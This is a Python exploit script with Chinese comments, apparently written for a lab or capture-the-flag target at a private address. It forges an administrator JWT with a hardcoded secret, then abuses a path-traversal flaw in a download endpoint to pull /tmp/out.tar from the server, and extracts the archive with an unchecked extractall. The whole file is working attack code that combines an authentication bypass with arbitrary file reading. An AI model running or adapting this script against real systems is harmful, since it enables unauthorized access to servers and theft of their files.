#!/usr/bin/env python3
"""
下载 /tmp/out.tar 文件
"""

import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def download_file(session, remote_path, local_path):
    """下载文件"""
    encoded_path = remote_path.replace('/', '%2f')
    url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
    
    print(f"[*] 下载: {remote_path}")
    print(f"    URL: {url}")
    
    r = session.get(url)
    
    if r.status_code == 200:
        with open(local_path, 'wb') as f:
            f.write(r.content)
        print(f"[+] 成功! 大小: {len(r.content)} bytes")
        print(f"[+] 保存到: {local_path}")
        return True
    else:
        print(f"[!] 失败: {r.status_code}")
        return False

def main():
    session = create_admin_session()
    
    # 下载 /tmp/out.tar
    success = download_file(session, "tmp/out.tar", "out.tar")
    
    if success:
        print("\n[*] 提取tar文件内容...")
        import tarfile
        try:
            with tarfile.open("out.tar", 'r') as tar:
                print(f"[+] tar文件包含:")
                for member in tar.getmembers():
                    print(f"    📄 {member.name} ({member.size} bytes)")
                
                print(f"\n[*] 提取所有文件...")
                tar.extractall("extracted_tar")
                print(f"[+] 已提取到 extracted_tar/ 目录")
        except Exception as e:
            print(f"[!] 提取失败: {e}")

if __name__ == "__main__":
    main()
